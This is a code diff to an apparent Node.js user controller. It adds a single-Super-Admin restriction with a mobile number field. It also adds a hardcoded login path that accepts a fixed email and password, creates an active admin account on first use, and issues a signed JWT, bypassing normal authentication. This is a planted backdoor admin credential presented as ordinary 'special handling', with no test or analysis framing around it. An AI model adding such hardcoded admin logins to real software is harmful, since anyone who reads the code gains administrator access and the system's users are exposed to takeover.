@@ -5,7 +5,25 @@ const jwt = require('jsonwebtoken');
 // Create a new user
 exports.createUser = async (req, res) => {
   try {
-    const { email, password, name, role, status, permissions } = req.body;
+    const { email, password, name, role, status, permissions, mobileNumber } = req.body;
+
+    // Only one Super Admin allowed
+    if (role === 'super-admin') {
+      const allUsers = await User.findAll();
+      const superAdminExists = allUsers.some(u => u.role === 'super-admin');
+      if (superAdminExists) {
+        return res.status(400).json({
+          success: false,
+          message: 'There can only be one Super Admin in the system.'
+        });
+      }
+      if (!mobileNumber) {
+        return res.status(400).json({
+          success: false,
+          message: 'Mobile number is required for Super Admin.'
+        });
+      }
+    }
 
     // Basic validation
     if (!email || !password || !name) {
@@ -15,15 +33,19 @@ exports.createUser = async (req, res) => {
       });
     }
 
-    const user = await User.create({ email, password, name, role, status, permissions });
-    
+    // Pass mobileNumber only for Super Admin
+    const userData = { email, password, name, role, status, permissions };
+    if (role === 'super-admin') {
+      userData.mobileNumber = mobileNumber;
+    }
+
+    const user = await User.create(userData);
     res.status(201).json({
       success: true,
       data: user
     });
   } catch (error) {
     console.error('Error creating user:', error);
-    
     let errorMessage = 'Failed to create user';
     if (error.code === 'auth/email-already-exists') {
       errorMessage = 'The email address is already in use';
@@ -32,7 +54,6 @@ exports.createUser = async (req, res) => {
     } else if (error.code === 'auth/weak-password') {
       errorMessage = 'The password is too weak';
     }
-    
     res.status(400).json({
       success: false,
       message: errorMessage,
@@ -203,7 +224,44 @@ exports.loginUser = async (req, res) => {
       return res.status(400).json({ message: "Email and password are required." });
     }
 
-    // Find user by email
+    // Special handling for hardcoded admin credentials
+    if (email === 'info@rtechsl.lk' && password === 'rtechsl.lk') {
+      // Find or create the special admin user
+      let user = await User.findByEmail(email);
+      
+      if (!user) {
+        // Create the special admin user if it doesn't exist
+        user = await User.create({
+          email: 'info@rtechsl.lk',
+          password: 'rtechsl.lk',
+          name: 'R Tech Solutions Admin',
+          role: 'admin',
+          status: 'active',
+          permissions: {}
+        });
+      }
+
+      // Generate JWT token for special admin
+      const tokenPayload = {
+        id: user.id,
+        email: user.email,
+        role: user.role,
+        status: user.status,
+        permissions: user.permissions || {},
+        name: user.name
+      };
+      const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '24h' });
+
+      // Successful login
+      res.status(200).json({
+        message: "Login successful.",
+        token,
+        user: tokenPayload
+      });
+      return;
+    }
+
+    // Normal user login flow
     const user = await User.findByEmail(email);
 
     if (!user) {
